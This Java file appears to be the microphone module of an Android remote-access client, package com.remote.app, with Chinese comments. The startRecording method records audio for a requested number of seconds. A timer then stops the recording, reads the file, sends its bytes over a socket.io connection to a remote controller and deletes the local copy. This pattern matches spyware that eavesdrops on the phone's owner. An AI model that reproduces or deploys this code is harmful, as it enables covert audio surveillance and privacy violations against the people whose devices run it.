package com.remote.app;

import android.Manifest;
import android.content.pm.PackageManager;
import android.media.AudioAttributes;
import android.media.MediaRecorder;
import android.os.Build;
import android.util.Log;

import androidx.core.content.ContextCompat;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.util.Timer;
import java.util.TimerTask;

/**
 * 麦克风管理器 - 录音功能
 * 
 * 兼容 Android 14+ (API 34+)
 * 支持新的 MediaRecorder API 和权限检查
 */
public class MicManager {

    private static MediaRecorder recorder;
    private static File audiofile = null;
    private static final String TAG = Config.LOG_TAG;
    private static TimerTask stopRecording;
    private static boolean isRecording = false;

    /**
     * 开始录音
     */
    public static void startRecording(int sec) throws Exception {
        // ========== 权限检查 ==========
        if (!hasAudioPermission()) {
            Log.e(TAG, "缺少音频录制权限 (RECORD_AUDIO)");
            throw new SecurityException("音频录制权限被拒绝");
        }

        if (isRecording) {
            Log.w(TAG, "录音正在进行中，忽略新的录音请求");
            return;
        }

        try {
            // ========== 创建音频文件 ==========
            File dir = MainService.getContextOfApplication().getCacheDir();
            
            if (!dir.exists()) {
                if (!dir.mkdirs()) {
                    Log.e(TAG, "无法创建缓存目录");
                    throw new IOException("缓存目录创建失败");
                }
            }

            audiofile = File.createTempFile("sound_", ".m4a", dir);
            Log.d(TAG, "音频文件: " + audiofile.getAbsolutePath());

            // ========== 初始化 MediaRecorder ==========
            recorder = new MediaRecorder();

            // 设置音频源
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);

            // 设置输出格式（Android 14+ 使用 MPEG_4）
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);

            // 设置音频编码格式
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);

            // 设置音频采样率（44.1kHz）
            recorder.setAudioSamplingRate(44100);

            // 设置音频比特率（128kbps）
            recorder.setAudioEncodingBitRate(128000);

            // 设置音频通道（立体声）
            recorder.setAudioChannels(2);

            // Android 10+ 设置音频属性
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                try {
                    AudioAttributes audioAttributes = new AudioAttributes.Builder()
                        .setUsage(AudioAttributes.USAGE_MEDIA)
                        .setContentType(AudioAttributes.CONTENT_TYPE_SPEECH)
                        .build();
                    recorder.setAudioAttributes(audioAttributes);
                } catch (Exception e) {
                    Log.w(TAG, "设置音频属性失败: " + e.getMessage());
                }
            }

            // 设置输出文件
            recorder.setOutputFile(audiofile.getAbsolutePath());

            // 准备录音
            recorder.prepare();

            // 启动录音
            recorder.start();
            isRecording = true;

            Log.d(TAG, "开始录音，时长: " + sec + " 秒");

            // ========== 设置停止录音任务 ==========
            stopRecording = new TimerTask() {
                @Override
                public void run() {
                    try {
                        Log.d(TAG, "停止录音");
                        
                        if (recorder != null && isRecording) {
                            recorder.stop();
                            recorder.release();
                            recorder = null;
                            isRecording = false;
                            
                            // 发送音频文件
                            sendVoice(audiofile);
                            
                            // 删除临时文件
                            if (audiofile != null && audiofile.exists()) {
                                audiofile.delete();
                                audiofile = null;
                            }
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "停止录音异常: " + e.getMessage());
                        isRecording = false;
                    }
                }
            };

            new Timer().schedule(stopRecording, sec * 1000L);

        } catch (Exception e) {
            Log.e(TAG, "启动录音异常: " + e.getMessage());
            e.printStackTrace();
            
            // 清理资源
            if (recorder != null) {
                try {
                    recorder.release();
                } catch (Exception ex) {
                    Log.e(TAG, "释放 MediaRecorder 异常: " + ex.getMessage());
                }
                recorder = null;
            }
            isRecording = false;
            
            throw e;
        }
    }

    /**
     * 停止录音
     */
    public static void stopRecording() {
        try {
            if (recorder != null && isRecording) {
                recorder.stop();
                recorder.release();
                recorder = null;
                isRecording = false;
                
                Log.d(TAG, "已停止录音");
                
                // 清理定时任务
                if (stopRecording != null) {
                    stopRecording.cancel();
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "停止录音异常: " + e.getMessage());
        }
    }

    /**
     * 发送音频文件
     */
    private static void sendVoice(File file) {
        if (file == null || !file.exists()) {
            Log.e(TAG, "音频文件不存在");
            return;
        }

        try {
            int size = (int) file.length();
            
            // 检查文件大小
            if (size <= 0) {
                Log.w(TAG, "音频文件为空");
                return;
            }

            Log.d(TAG, "发送音频文件，大小: " + formatFileSize(size));

            byte[] data = new byte[size];
            BufferedInputStream buf = new BufferedInputStream(new FileInputStream(file));
            
            int bytesRead = buf.read(data, 0, data.length);
            buf.close();

            if (bytesRead != size) {
                Log.w(TAG, "文件读取不完整: 期望 " + size + "，实际 " + bytesRead);
            }

            JSONObject object = new JSONObject();
            object.put("type", "audio_file");
            object.put("file", true);
            object.put("name", file.getName());
            object.put("size", bytesRead);
            object.put("buffer", data);
            
            IOSocket.getInstance().getIoSocket().emit(Config.MessageType.MIC_RECORD, object);
            Log.d(TAG, "音频文件已发送");

        } catch (FileNotFoundException e) {
            Log.e(TAG, "音频文件未找到: " + e.getMessage());
        } catch (IOException e) {
            Log.e(TAG, "读取音频文件异常: " + e.getMessage());
        } catch (JSONException e) {
            Log.e(TAG, "JSON 序列化异常: " + e.getMessage());
        } catch (Exception e) {
            Log.e(TAG, "发送音频文件异常: " + e.getMessage());
        }
    }

    /**
     * 检查音频录制权限
     */
    private static boolean hasAudioPermission() {
        return ContextCompat.checkSelfPermission(
            MainService.getContextOfApplication(),
            Manifest.permission.RECORD_AUDIO
        ) == PackageManager.PERMISSION_GRANTED;
    }

    /**
     * 检查录音是否进行中
     */
    public static boolean isRecordingNow() {
        return isRecording;
    }

    /**
     * 格式化文件大小
     */
    private static String formatFileSize(long bytes) {
        if (bytes <= 0) return "0 B";
        final String[] units = new String[]{"B", "KB", "MB"};
        int digitGroups = (int) (Math.log10(bytes) / Math.log10(1024));
        return String.format("%.1f %s", bytes / Math.pow(1024, digitGroups), units[digitGroups]);
    }
}
